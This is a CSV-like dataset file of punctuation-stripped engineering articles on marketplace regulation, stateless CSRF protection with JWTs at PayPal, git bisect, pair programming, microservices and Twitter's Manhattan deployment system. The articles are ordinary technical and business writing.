 As a result  marketplaces face serious regulatory challenges much more frequently than traditional product or service companies do  Should homeowners renting out their properties be subject to hotel taxes  Under what conditions should individuals be allowed to sell rides in their cars  When should marketplaces for services be allowed to treat their service providers as independent contractors and when should they be compelled to treat them as employees   With respect to regulatory risks  most entrepreneurs have one of two reflexes  ignore them or try to fix everything up front  Neither is a good idea  Unwinding a regulatory problem late tends to be much more difficult than preventing it early  Furthermore  ignoring regulations can generate bad press  which may alienate users  At the other extreme  attempting to clear all regulatory hurdles from the beginning is unrealistic  Regulatory time frames are too long for most young companies to work within  and it is very hard to gain clearance for a business concept that has not yet been proved in the market   For a look at this problem from the incumbent s perspective  see  Spontaneous Deregulation   by Benjamin Edelman and Damien Geradin  in this issue    The right approach  not surprisingly  is somewhere in the middle  Strive to engage regulators without breaking stride or slowing down to the decision making speed of governments  No marketplace we know of has dealt with all its regulatory challenges perfectly  but four interconnected guiding principles developed by David Hantman  Airbnb s former head of global public policy can help   1  Define yourself before your opposition or the media does   Marketplace entrepreneurs should develop a clear vision of their business model and find the most positive yet accurate way to describe it to the outside world  Then they should engage regulators and the media to ensure that they are understood on their own terms   2  Pick the time and place to engage with regulators   Entrepreneurs operating in industries subject to heavy and national regulation should consult an industry attorney before launch in order to fully understand all relevant laws  As soon as their buyer seller proposition is clear  they should initiate a dialogue with regulators in order to obtain either explicit legal clearance  ideal  or an implicit safe haven  second best  for continuing to develop the service   The examples of Lending Club and Prosper  the two leading peer to peer lending marketplaces in the United States  illustrate the importance of smoothing regulatory frictions before they grind you to a halt  Prosper was launched first  in 2005  followed by Lending Club a year later  Lending Club  however  was first to tackle the difficult regulatory issues  Less than two years after its launch  it established a partnership with an FDIC insured bank so that the loans it facilitated were subject to the same borrower protection  fair lending  and disclosure regulations as regular bank loans  In early 2008  it became the first peer to peer lending marketplace to voluntarily go through a quiet period during which it did not accept any new lenders and focused on completing its registration with the U S  Securities and Exchange Commission  SEC  as an issuer of public investment products   In contrast  Prosper ignored regulatory issues until scrutiny by the SEC forced it  too  to enter a quiet period  The results of these differing approaches were significant  Prosper s quiet period lasted nine months  whereas Lending Club s lasted just six  And Lending Club was allowed to continue to serve the borrower side of its marketplace during its quiet period  Prosper had to shut down both the investor and the borrower sides  Lending Club eventually overtook Prosper to become the largest peer to peer lending marketplace  In 2012  it made  718 million in loans  compared with  153 million for Prosper   Gray areas offer an opportunity to turn a regulator into a partner   At the other end of the spectrum  marketplaces operating in spaces that are regulated lightly and only at the city or state level can afford to wait until they reach supply demand fit in their first city before engaging with regulators  While regulatory issues at the national level are usually a matter of life and death for companies  local regulators are typically less powerful and can be more easily circumvented if necessary   3  Don t just say no  offer constructive ideas   When confronted with regulatory gray areas an all too common occurrence marketplace entrepreneurs have an opportunity to turn a potentially adversarial relationship with regulators into a partnership  For example  Getaround  the peer to peer car rental platform  preempted a collision by working directly with the California state government to enact a law that allows private individuals to rent out their cars to strangers under separate insurance coverage designed for this purpose  Getaround s approach is remarkable because peer to peer car rentals were not explicitly illegal beforehand meaning that the company incurred a significant risk by drawing regulatory attention to its service   Even when existing regulations are merely inconvenient for new marketplaces  entrepreneurs should resist the temptation to ignore or thumb their noses at the relevant authorities and strive instead to find an area where their interests align  For example  a major concern for governmental bodies that regulate taxis is ensuring the safety of passengers and drivers  Ridesharing companies should want the same thing  The marketplaces could use their data on driver and passenger identity and on trip times and paths to work constructively with state regulators to create a safer environment than traditional taxi companies provide   4  Speak softly and carry a big stick   Entrepreneurs should avoid engaging in acrimonious disputes with regulators  at the same time  they should have effective weapons at their disposal to defend their position  They can use two means of leverage when fighting potentially adverse regulation  The first is the power of satisfied buyers and sellers  who are voters and taxpayers likely to resent government interference with a service they value  To harness the support of users  companies should develop a credible infrastructure for running lobbying campaigns in their own behalf  social media  dedicated websites  and so on  For example  Airbnb helped its San Francisco hosts organize rallies around city hall and testify in public hearings  which eventually swayed the city s regulators to legalize short term rentals in people s homes in 2014  the  Airbnb law     The second lever is tax revenue  Marketplaces that generate sizable revenues for local governments have some leverage in regulatory negotiations  For instance  as part of its ongoing efforts to persuade city governments to legalize its service  Airbnb has offered to collect hotel taxes from its hosts and remit them to local authorities in several cities worldwide  This offer  still pending approval  is clearly a powerful negotiating instrument  According to conservative estimates  the taxable revenue generated by Airbnb hosts was more than  5 billion in 2015  This is an interesting case  since few marketplaces have proactively offered to take responsibility for ensuring that their users pay taxes   Sometimes  if regulatory uncertainty is unlikely to be resolved in the immediate future  a time frame measured in months for start ups  and the repercussions of noncompliance are severe  then the right response is to comply with the worst case scenario  even if that means incurring higher costs  One of the most serious regulatory issues now faced by service marketplaces concerns the legal status of their workers  Several prominent service marketplaces  Handy  Lyft  Postmates  Uber  and Washio  are currently contending with class action lawsuits that accuse them of improperly classifying their workers as independent contractors rather than employees  The cost implications are substantial  Changing a worker s status from independent contractor to employee increases costs by 25  to 40   While the outcomes of the lawsuits and the corresponding regulation are still uncertain  some marketplace start ups  including Alfred  Enjoy Technology  Luxe  and Managed by Q  have preempted the issue by voluntarily turning their workers into employees  Early stage start ups that simply cannot afford to operate under uncertain regulatory status may need to do the same  In most cases  however  an intermediate status somewhere between employee and independent contractor would be the ideal approach   Online marketplaces are profoundly changing the nature of work and of companies  Since the early days when marketplaces made it possible to sell and buy simple products like PEZ dispensers and handicrafts  the assortment and price range of goods available online has exponentially increased  Over the past five years  platforms for a remarkable variety of task oriented services have arisen  New technologies such as 3 D printing and virtual reality will continue to open up opportunities for individuals and small firms to directly sell increasingly complex products and services previously provided only by large firms   The growing number of products and services available through online marketplaces will cause traditional corporate structures to gradually shrink and coexist with overlapping networks of independent workers who come together for limited periods of time to perform specific tasks  The result will be a much more fluid and flexible work environment that empowers both workers and customers  But the challenges of managing growth  building trust and providing safety  minimizing disintermediation  and shaping regulation won t go away  The solution is not to follow the pack  It is to deeply understand the needs of customers  regulators  and society as a whole and  in a disciplined fashion  become an active player in shaping the future,"[572 451 281 171 1300 809 707 1351 344 1016 778]"
576,training-dataset/engineering/300.txt,engineering,Securing your JS apps w  Stateless CSRFHey there  You might have stumbled upon this post because you re interested in securing your JS apps  or maybe you ve heard about the other things we have open sourced   Today we re releasing jwt csrf  a stateless CSRF solution for securing your JavaScript apps   It s something we ve built and battle tested over the last year while building PayPal Checkout  In addition to talking about jwt csrf  I d like to talk about our journey of re architecting PayPal Checkout and share our learnings and discoveries   If you ve checked out with PayPal in the last year or so  woohoo  You know what we work on    By the way  if any of this is interesting to you  we re hiring  DM me at  mark_stuart  Why stateless   About a year ago  we were stuck in a jam where we had way too much state on our server side and caused us to take a step back and re think many aspects of our architecture   If you re familiar with Express  you know about req session  which is basically a global variable that is scoped to a user s session and hangs off of the request object  This usually isn t a problem for solo developers or really small development teams  but as soon as you add more developers to the mix  you will reach a point where most of your issues are around maintaining state    Shared mutable state is the root of all evil     Someone smart  Just a couple examples of our pain    Slow experimentation   Our client side was unable to evolve without code changes in our server side     Our client side was unable to evolve without code changes in our server side  Brittle middleware   Our common middleware functions had to be stacked in a particular order  otherwise they wouldn t work  Some of these middleware would depend on some values in req session that were randomly set by other middleware  If you use Express  this one should ring home   Okay  so global mutable state is bad  But  what s the alternative   We decided that we were going to go completely stateless  Rather than building  god  endpoints that do a lot of orchestration and rely on stateful flags in req session  we built atomic APIs that do 1 thing  and 1 thing only  Ex  Get cart details  Add a credit card  etc   Along with that  we had to make changes to the way we authorize users with CSRF  If you re unfamiliar with CSRF  here s a quick crash course   What is CSRF   CSRF  or  cross site request forgery   ensures that requests made to your server side are legitimate and originate from your app  That last part is key   If a user is currently logged in with PayPal  they have session cookies dropped in their browser that are scoped for paypal com  If that user then visits a site that has been compromised  the site can make requests to paypal com on the user s behalf  with the user s cookies   This could be really dangerous  imagine an attacker adding their bank account to the user s PayPal account  then transferring the user s PayPal balance to the attacker s account  Yikes   Luckily  this attack is avoidable with CSRF protection   The most common CSRF pattern is the synchronizer pattern  where a CSRF token is generated server side  dumped on a page s first render  and passed back to the server side on subsequent requests  usually as a hidden form param or AJAX request header   When the token s validated on subsequent requests  it s validated against a secret key that hangs off of req session   By the way  there s nothing wrong with this  We open sourced lusca under the krakenjs umbrella  It s an excellent option for CSRF protection if you re building an Express app with sessions enabled  But  we re going stateless   Okay  so now you re thinking  how do you provide CSRF protection without a session  You said you went stateless  Enter jsonwebtoken  JWT    jsonwebtoken  JSON Web Token  JWT  is an open standard  RFC 7519  that defines a compact and self contained way for securely transmitting information between parties as a JSON object  This information can be verified and trusted because it is digitally signed   Since there s no state on the server side to compare the token against  we re going to store our state inside of the token   Encrypted Sample JWT    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9 TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ  Decrypted Sample JWT     alg  HS256  typ  JWT    time timestamp logged_in true  signature  When this token is decrypted  it contains a header  payload  and a signature  The most important being the payload and signature   The payload contains the user s claims that they are who they say they are  You can define whatever you want inside the payload  But it s usually a good idea to add a timestamp  some uniquely identifiable information like a user s account ID  and some indication of if they re logged in or not  That way  when the token is validated  you can check if the token is expired  check if the user account ID matches  and they re logged in  Ex  if they re hitting an API that requires authentication    The signature verifies that the sender is who they say they are and the message wasn t tampered along the way  It s constructed by digitally signing  via a secret  the header  payload  and secret   If the signature is valid  the payload is legitimate   Good news  jwt csrf takes care of generating and verifying JWTs using various CSRF patterns  Here s how that works   jwt csrf  jwt csrf provides server side and client side  optional  code to do all of the heavy lifting of generating validating JWTs using CSRF patterns   On the server side  if you re using Express  you can use it as middleware  And even if you re not using Express  it s available programatically  We baked in 3 strategies for generating and validating tokens  It defaults to the double submit pattern   On the client side  optional   we provided some code that patches XHR to send the token along with each request   If you re wondering if this is safe to use in production  yes it is  We ve been serving millions of users every day for over a year now   Thank you   Big thanks to Praveen Gorthy  the original author of jwt csrf   If you have any questions issues  please file an issue  Contributions are welcome too  of all kinds  Docs  code  tests  etc  If you re new to open source  no worries  I ll help you through it   Let s keep the conversation going    Tweet me  mark_stuart    Mark Stuart  Lead Engineer Architect at PayPal  Hack the planet,"[576 897 886 61 683 778 1351 1300 915 1309 1225]"
579,training-dataset/engineering/583.txt,engineering,Automatically Locate When and Where Bugs Were Introduced with git bisect        Let s face it  when developing software things will break  Most of these things were probably working before hand  but some change directly or indirectly has broken it       Best case scenario is you immediately recognise why it is broken  On the other end of the scale is some obscure bug that s only happening sometimes  you have no idea why and it seems like none of the recent code changes should have even effected it  Argh  What next       Well  first of all  take a deep breath  confidently crack your knuckles and open your terminal with with a menacing grin  Now you re ready       Let s start with what we do know  Well  we know that at some point in the past it was working and we know now that s it not  Therefore it s pretty fair to surmise that one of the commits between now and then must have broke it       You should be on a commit that is known to be broken  This will probably just be the branch you re on  Make sure you have a clean checkout  no changes  and start the bisect process       git bisect start      If all goes well you will not receive any output  As mentioned above we know that this version of the software has the bug  so we mark this commit as bad       git bisect bad      Again  there will be no output if it s all good       Now we need to find and checkout a commit that we know is good  does not have the bug   In this case I know it was working on 2016 08 03 so I can use git rev list to find me the latest commit at that date  Alternatively you could just checkout a known tag  branch  commit  or whatever you are fairly sure was working       git checkout   git rev list   max age 2016 06 03   date order   reverse HEAD   head  n 1       The important next step here is that you confirm that the bug is not occurring before proceeding  If the bug is still there you need to checkout an even older commit and try again  Keep doing this until you can confirm the bug is not there  and now proceed by telling git the commit is good       git bisect good      Now you should see some meaningful output as git bisect is ready to do it s magic       Bisecting  987 revisions left to test after this  roughly 10 steps   8fe7a35242303e8316c1d77883c0e247db6df5a8  testDefaultTotalCountIsZero      Bisect literally means to divide into two parts  and that s what git has just done  It has found the middle commit between the 987 revisions and performed a git checkout        Now it s up to you to test if the bug exists at this commit  If the bug does exist you should type git bisect bad   If it does not exist you should type git bisect good   Each time you do this the number of revisions should half       Bisecting  489 revisions left to test after this  roughly 9 steps   03c4c4e5bd1740a277a606dd208e17a855761243  Merge branch  release 1 5  of https   github com elliotchance concise into 1 4 193 set color scheme      You will have to repeat this around 9 more times with git bisect good or git bisect bad until there is no more to bisect and you should see something like this       57a00e86622073c887be101a2e76c079245e519c is the first bad commit      Hooray  Here are some useful commands to inspect the bad commit and hopeful it will be very obvious what the code change was that caused the bug       git show 57a00e8 git diff 57a00e8 57a00e8       It s important to tell git bisect when you are finished       git bisect reset      This will tell git bisect you are finished and clear all the progress  so be careful if you re not finished   It will also checkout the commit you were on when you did the git bisect start        Gotchas      You will find that the rinse and repeat process above works most of the time  but there are a few little tricks for when it goes wrong       If you cannot manually test a commit  For example  your program does not compile then you can use git bisect skip to let git bisect know that you can t verify it either way and git bisect will try to recover by picking a commit thats very close to this without further bisecting  git bisect is very clever in that it will isolate the commit even if it s not a completely linear ancestry  If you know several commits that are good or bad going in you can checkout and confirm these individually at any time without affecting progress  or hopefully lessening it   Each git bisect requires a git checkout which requires a clean working directory  It is common to have to tweak the code at each step to verify your bug  However  you will have to return the code to a clean checkout state before proceeding  This is especially annoying if you need to apply and revert the same patch for each step  For this I would recommend git stash        For Lazy People      If your test is something that can verified through the console  such as finding when a unit test started to fail  You can use git bisect run to automate the process  git bisect run will use the exit status on the command you give it to decide if the commit was good or bad  Here is an example       git bisect run phpunit   filter testRecordIsSavedToTheDatabase,"[579 895 1008 1326 550 778 1225 1399 713 1235 806]"
582,training-dataset/product/330.txt,product,The Broken Window Theory In Design   Product DevelopmentBlocked Unblock Follow Following  Self taught Designer   Maker  Un Employed  Founder of Semplice  Formerly Spotify   More About me  http   www vanschneider com,"[582 941 134 143 262 308 988 1138 112 639 60]"
588,training-dataset/engineering/879.txt,engineering,Adventures In Pair ProgrammingAs the internet and availability of data has disrupted many industries  one career field that cont  Adventures In Pair Programming  Phil Horowitz  senior software engineer at Perforce Software  shares his experiences with pair programming  Proponents of the practice say it s a good way to improve code ownership  insure continuous code review  increase productivity  and reduce distractions  Here s what the Perforce crew found out after being locked in a room with coworkers for the better part of a year     10 Must Read Books For All Programmers  Click image for larger view and slideshow    Imagine that you had someone looking over your shoulder at work at all times  Things that you do every day  like checking Facebook for a quick break or drafting an email to your boss  are different with a coworker watching  It may come as a surprise  but our company arranged that very thing  On purpose   We re talking about  pair programming   While it s not widely practiced  most software developers are familiar with the concept  At its most basic  pair programming is exactly what it sounds like  two people working on the same problem  usually on the same machine   Proponents of pair programming say it is a good way to improve code ownership  insure continuous code review  increase productivity  and reduce distractions  read  keep people on task   The main argument against it is that it is more expensive to use two people to do something one person might be able to do alone   The one aspect that is often ignored in the paired programming discussion is how it affects learning  You ll soon see that the opportunities for learning may be one of the best arguments for paired programming   The Decision to Pair  A Business Case  When we set out to develop our first cloud based product  we knew that developing cloud based software would require learning a completely new set of tools and processes  compared to the on premises products we d worked on in the past  We needed someone to help us expand our skillsets   We chose Pivotal Labs  the consulting firm and incubator that helped start Twitter  Pivotal has a very important rule  however  They require pair programming  Little did we know  this was going to be quite the adventure    What will catapult your career to the next level  Read 8 Non Tech Skills IT Pros Need to Succeed    Our pair programming adventure began each morning by picking a new partner from our team of eight people    four from Perforce and four from Pivotal Labs  We practiced ad hoc pairing  developing with different people every day  Our team members ran the gamut of development experience  from the most junior to the most senior   This diversity proved difficult to manage  By its very nature  the effectiveness of pair programming depends on the individuals practicing it  It leads to a lot of different personality clashes  Picture all the moods from Pixar s Inside Out   The only issue we ran into was usually someone who stopped talking and coded on their own  leaving their partner hanging  This didn t happen too often  though  and was resolved without much intervention  While there were constant disagreements  they were usually constructive and led to good conversations about how to implement something   Personally  it took me about a week to fully acclimate  The first day was the toughest  the next day was considerably easier  We all learned to adjust the process as we went along  but this led to one of the first roadblocks we encountered  project overload    Image  XiXinXing iStockphoto   You know the scene in the movie The Fifth Element where Mila Jovovich learns everything she needs to know about planet Earth by scanning her eyes over a monitor  That s how fast you learn in pair programming  Okay  maybe not quite that fast  but with someone sitting next to each of us explaining new concepts in real time  whether languages  processes  or tools   we all were in development overdrive   This makes pair programming intense  especially at the beginning  At the end of the first day  I couldn t go home  Before I could face humans again  I put my phone on airplane mode  ignored my usual online accounts  and went to the gym for two hours of self imposed isolation   But the good news is that things got easier geometrically over the first week  By week two I was fully acclimated  I don t think this would happen to me if I did a full day of pairing again  Adaptation has become a skill that I m confident I ll take with me to other environments   Ironing out the Kinks  Finding Value in Pairing  As frightening as this sounds  the  togetherness  ended up having a tremendously positive impact beyond the initial goal of learning cloud development   Pair programming forces teams to examine every feature from multiple angles and perspectives  something that s not possible with individual coding  You may think that collaborating through code reviews is an efficient system  but it s nothing compared to getting real time feedback from the person next to you  Code quality vastly improves when you have to explain or defend your decisions  and when you re able to stop someone and have that person explain things to you   Another benefit is something that can morbidly be summed up as a reduction in  bus value   the impact on the project if someone on your team got hit by a bus  Pair programming democratizes knowledge  Everyone becomes familiar with a variety of tools  processes  and project areas  While pairing takes an additional investment of time and resources  the organization is essentially spreading and increasing value across an entire team   Taking It Back Home  One Size Does not Fit All  When we brought our project back to home base  we became a cultural outlier  We pushed pairing as hard as we could  but eventually we realized it wasn t a good fit for everyone  Ultimately  this led us to practice pair programming on a limited basis   The takeaway from the experiment is that we now see pair programming as a skill  rather than a process to be implemented and reinforced from an organizational standpoint  If someone asks me   Do you want to pair   I can respond  Yes    No   or  Why are you bothering me  I m eating lunch   We still pair once in a while  when a problem gets tough or we need a new set of eyes  but it s no longer the default or a required practice   We came to pair programming expecting to become better developers  and we succeeded    but not for the reasons we thought  We learned that being a good developer isn t only about speed or grasp of languages and methodologies  Good development is more social than we ever imagined  It s an opportunity to geek out with your coworkers and reignite your passion for your work  while also helping to evolve your skills and overall code quality   If you are a CIO or development leader considering implementing pair programming  our experience shows that  instead of seeing it as an all or nothing policy  think of it as a skill for your programmers to acquire  and as a way to boost the knowledge of your whole team   We went from being in a fairly isolated culture to being an extremely open and talkative one  Now  we re somewhere between those two points  Your own teams will need to determine where they re most comfortable working along that spectrum   The more you can push towards collaboration the better off you ll be  If you think of it in those terms  it can be a success  whether or not your whole team turns full time to pair programming   Ready For A New Job   InformationWeek s hosted  searchable job board can help you find your next gig  Start your search today   Phil Horowitz got his start in the gaming industry by working on tools for artists and designers  Now he is a senior software engineer at Perforce  building source code management solutions for gaming and many other types of development teams  Phil enjoys learning new     View Full Bio  Comment    Email This    Print,"[588 1234 641 778 1225 656 935 234 683 806 61]"
596,training-dataset/engineering/730.txt,engineering,Microservice architecture is agile software architectureSince the term  microservices  hit the software industry like a bolt of lightning in 2014  technical professionals of all stripes have been analyzing this new architectural style from their own frames of reference  Having lived through the rise and fall of service oriented architecture  I had the same reaction as many others  How does microservice architecture differ from SOA  The more I learned about the case studies that led to the creation of the term  microservices   the more I recognized that this question would not capture the essence of this new software movement   The first thing to recognize about the microservice movement is that it has been empirically defined  Microservice architecture emerged from a common set of patterns evident in companies like Amazon  Netflix  SoundCloud  and Gilt  now part of HBC Digital   Applications at these companies that were monolithic evolved over time into decomposed services that communicated via RESTful APIs and other network based messaging protocols     Download InfoWorld s essential guide to microservices and learn how to create modern Web and mobile applications that scale    Cut to the key news in technology trends and IT breakthroughs with the InfoWorld Daily newsletter  our summary of the top tech happenings     However  the commonalities were not restricted to architectural patterns  The companies at the forefront of microservices also shared a common approach to software development  had similar organizational structures and cultural practices  and shared an affinity for cloud based infrastructure and automation  Many companies that succeed with microservices have followed a similar progression driven by a desire for development speed and scalability   The agile progression  In early 2001  a group of software professionals published the Agile Manifesto as a statement of values on how to improve software development  Although the principles stated were not new    they were a consolidation of ideas from extreme programming  scrum  lean  and more    the unified voice caught the industry s attention  Just as microservice architecture is frequently defined in contrast to monolithic architecture  the manifesto differentiates agile software development from  documentation driven  heavyweight software development processes   The agile approach sought to remove the overhead and risk of large scale software development by using smaller work increments  frequent iterations  and prototyping as a means of collaboration with users  The adoption of agile methods in the industry grew consistently following the publication of the manifesto   The spread of agile methods also led to the popularization of continuous integration  CI  in the software industry  a common practice from extreme programming  CI sought to combine software components as early in the lifecycle as possible in order to minimize the impact of code integration issues  However  many of the early agile adopters found that once they had removed the bottlenecks in the coding  they hit snags in releasing the software  These difficulties were only amplified by the popularization of SaaS as an increasingly preferred deployment option   To address the need for more frequent software releases  the practice of continuous delivery  CD  started to gain traction in 2006  taking the internal CI concept and applying it to the external view of software deliverables  CD takes scrum s quality focused  potentially shippable product increment  literally  defining a deployment pipeline to bring changes to production as quickly as possible  Virtualization and cloud computing removed technological barriers to CD  and new tools emerged to institutionalize CD practices  The combination of agile and CD was improving both the speed of production and the quality of the software produced   Still  there were bottlenecks  Agile s primary scope was on the development of software  while CD extended that scope to include production deployment  an operations task  In most organizations  development and operations were consciously divided in both reporting and mission  In 2009  John Allspaw and Paul Hammond from Flickr gave an influential talk at the O Reilly Velocity conference detailing how they had bridged this gap  From experiences like theirs  the devops movement arose to address this cultural divide   Organizations found that combining development and operations responsibilities in the same team led to highly effective continuous delivery practices  As collaboration increased between dev and ops  so did empathy  Developers designed solutions that included an operational perspective from the outset  and operations people used an engineering approach to tackle problems that were previously dealt with procedurally  Greater use of automation in day to day tasks resulted in greater system stability and resilience  Netflix s Simian Army approach to testing the resilience of production systems is an extreme example of this   The organizations that followed this  agile progression     from addressing software development to deployment to organizational structure    now had alignment in these areas  Many of these agile pioneers were Web native and provided their software solutions in a single application stack  As the complexity and scale of their businesses increased  they found that this architecture not only became an impediment to new feature delivery  but caused stability issues due to brittleness and lack of scalability  In parallel  several companies    such as SoundCloud    discovered that breaking their monolithic applications into discrete  business focused services was more suitable to their agile delivery methodology and devops culture  This is the true origin of microservice architecture  Microservices are the architectural phase of the agile progression   Microservices are the architectural phase of the agile progression   In search of agile software architecture  In a 2013 post on his blog  Coding the Architecture   software architect Simon Brown speculated about what an agile software architecture would look like  He points out that an agile architecture does not naturally emerge from agile development practices  Rather  it must be consciously sought  Note that his description of agile software architecture is a perfect match for microservice architecture  emphases mine    If we look at the characteristics of an agile software architecture  we tend to think of something that is built using a collection of small  loosely coupled components services that collaborate together to satisfy an end goal  This style of architecture provides agility in a number of ways  Small  loosely coupled components services can be built  modified and tested in isolation  or even ripped out and replaced depending on how requirements change  This style of architecture also lends itself well to a very flexible and adaptable deployment model  since new components services can be added and scaled if needed   Companies like Amazon  Netflix  SoundCloud  and Gilt encountered an architectural bottleneck when they reached a certain scale  This barrier motivated them to focus on the architecture  as Brown encourages  and they landed on microservices   There are important lessons to be gleaned from tracking this agile progression through to its architectural phase  First of all is that agile software development  continuous delivery  devops culture  and microservice architecture are all bound by a common set of goals  to be as responsive as possible to customer needs while maintaining high levels of software quality and system availability  Although these phases evolved in a particular order from the industry perspective  there is no right sequence for an individual organization to follow  For example  Amazon adopted an architecture that forced changes to its organization  By contrast  SoundCloud evaluated its delivery methodology and made changes to its team structure and architecture as a result   If you are evaluating how you can adopt microservices  it is important to understand where your organization is on the agile progression  Are you an agile shop  If so  who is looking after the architecture of your applications  If not  are you on a path to adopt agile practices  Do you have CD and deployment pipelines in place  What is the relationship between your development and operations teams  and who owns those responsibilities  Weighing the answers to these questions against your primary goals for adopting microservices will help you chart the right course to success that includes incremental wins along the way   This is the first post in a two part series from Matt McLarty  co author of the upcoming book  Microservice Architecture  from O Reilly Media  This series shares applicable lessons from the evolution of microservices  To learn directly from the early adopters of microservices and to receive a free digital copy of the new book  attend the API360 Microservices Summit in New York on June 16  2016   Matt McLarty is an experienced software architect who leads the API Academy at CA Technologies   New Tech Forum provides a venue to explore and discuss emerging enterprise technology in unprecedented depth and breadth  The selection is subjective  based on our pick of the technologies we believe to be important and of greatest interest to InfoWorld readers  InfoWorld does not accept marketing collateral for publication and reserves the right to edit all contributed content  Send all inquiries to newtechforum infoworld com,"[596 1042 773 278 60 1126 695 1159 234 935 1377]"
597,training-dataset/engineering/953.txt,engineering,Manhattan software deployments  how we deploy Twitter s large scale distributed databaseTwitter s Manhattan distributed database is one of the primary data stores at Twitter  serving Tweets  Direct Messages  and advertisements  among other use cases  We want to share the challenges of handling Manhattan software deployments and our approach to solving them   The Manhattan service runs on clusters of thousands of physical hosts in multiple data centers  Each instance of the Manhattan service can be viewed as two parts consisting of a stateless coordinator process  to handle the routing of the requests  and the stateful backend layer  which stores the actual data   For reliability guarantees  the same data is replicated to a set of instances   typically three   called a mirror set  The focus on this post will be on the core Manhattan service described above  We won t cover supporting services   such as the topology manager  configuration web service  and metadata service   because those services have far more relaxed deployment constraints compared to the core service   Challenges  At its heart  deployment can be simply viewed as distributing the software package and restarting the service  But the constraints and challenges involved in safely deploying a distributed database complicates this process   While Manhattan is a multi tenant datastore  we also run independent Manhattan clusters supporting specialized use cases such as read only  in memory  and strongly consistent  Some Manhattan customers also have unique hardware requirements and are hosted on separate clusters  So in a typical deployment cycle  we canary test and deploy to thousands of physical hosts across numerous clusters in multiple data centers   The scale at which Manhattan operates directly impacts the speed at which we can deploy  We want to make deployments faster to be able to do frequent deploys with small sets of changes   The size of the Manhattan package is close to 300MB  We need to ensure that the package is rapidly deployed to all the hosts   In order to provide consistency guarantees   we can only restart a small subset of nodes in a mirror set at once  This means the restart logic must be aware and up to date with the topology of the cluster throughout the deployment   To ensure safety   the restart logic should also take into account broken mirror sets  planned maintenance  and unplanned outages during the deployment   We always have to guarantee that only a percentage of hosts in the cluster can be restarted at the same time without affecting the availability of the cluster   Manhattan deploy should be transparent to our customers  This means our deployment systems should ensure that Manhattan adheres to the same performance  reliability  and availability guarantees during deployments as normal operations  In addition  the deployment service should be cognizant of current outages affecting other services in the company and be able to pause or rollback the deploys to avoid aggravating the situation   In summary  the challenges of Manhattan deployment can be categorized as the problems of scale and the requirement for speed and safety   Goals  We have built a deployment service for Manhattan with the following characteristics and features   Fully automated and easy to use  Ability to honor the constraints required for safe deployments  Facility for suspending and rolling back a deployment  Capability to schedule deploys  e g   business hours only deploys  emergency deploys  hot fix deploys  and specify dependency  order of clusters  and number of clusters in parallel for each deploy  Support for an audit trail and a deploy history  Approach  The Manhattan package is composed of two sub packages   Manhattan coordinator and backend binary Configuration files  Different clusters typically use the same coordinator and backend packages but have specialized configurations  Both packages are versioned separately and can be deployed independently   In a nutshell  a deployment cycle goes through the following steps   Creation of a test build from the latest committed code Deployment of canary to canary Manhattan hosts If the canary looks good  creation of a production build Full stable production deployment  Components  The operator submits the deployment plan through a command line tool or a web interface   Scheduler  The Scheduler service receives a plan from web interface or command line and coordinates with different cluster managers to safely execute that plan   Sample plans   Canary plan  canary build X on clusters A  B  and C on 10 hosts each and on clusters D  E on 5  of hosts   Rollout plan  rollout build X on all Manhattan clusters  start with cluster A then do B and so on  Do only one data center at a time  Do not initiate any roll after 4pm and avoid any known incidents   Cluster manager  This component continuously monitors deployment status  on a per cluster basis  and updates the deploy status   It creates a deployment configuration based on the deployment plan submitted by the scheduler  This deployment configuration includes things like the package version number  The cluster manager then set this information in ZooKeeper  At this point  the new deployment state is logged and stored to provide an audit trail  This audit trail is very useful when you need to rollback to a well known state   It does a pre deployment validation and continuously checks the health of the cluster via a monitoring service  It also looks out for company wide outages and deploy moratoriums  Based on these signals it makes decision to suspend or continue the deploy   It also checks if the deploy is complete and looks out for failure states   Finally  it is the job of the cluster manager to track and report progress of rolling restarts via email and IM notifications   Deploy agent  This is the part of the deployment system responsible for rapidly distributing the Manhattan binaries to all the hosts in the cluster  It consists of two parts   A daemon called deploy agent runs on each Manhattan host  The deploy agent watches a ZooKeeper node for deployment updates issued when a new deployment plan has been scheduled  The deploy agent launches handler scripts locally based on the configuration found in ZooKeeper  They do the task of downloading the packages from Packer   When a new deployment plan is executed  batches of hosts download the new packages in parallel  Typically  all hosts in an about twenty five hundred hosts cluster receive the package within five to seven minutes  The deploy agent also caches a set of previously downloaded packages on disk to save on time required for rollbacks   OpsGenie  OpsGenie is the topology management service for Manhattan and manages various aspect of Manhattan related to data placement throughout the cluster  One of its components is responsible for driving a safe cluster wide rolling restart  It enforces hard restrictions to support consistency guarantees  i e   no more than a small subset of hosts in a mirror set should be down at any given time  while also allowing for controllable concurrency of total number of hosts that can be restarted in the cluster   Conclusion  During the early days of Manhattan development  the packages were built on some developer s laptop and manually copied to the production hosts which was both cumbersome and error prone  We have come a long way since then and as we continue to grow in scale  the deployment service saves countless engineering hours and ensures that deployments are a safe  easy  efficient  and joyful exercise   If you think this is interesting and would like to work on similar problems  the SRE team at Twitter could use your help   join the flock   Acknowledgements  Special thanks to Istvan Marko for his contribution to this project and blogpost   We also want to acknowledge contributions by Alex Yarmula  Boaz Avital  Chris Hawkins  David Helder  Devin Kowatch  Juan Serrano  Kevin Crane  Pascal Borghino  Peter Beaman  Peter Schuller  Ravi Sharma  Ronnie Sahlberg  Sumeet Lahorani  Vladimir Vassiliouk  and others from the core storage team at Twitter,"[597 1010 1336 1351 1403 550 92 1393 1225 500 61]"
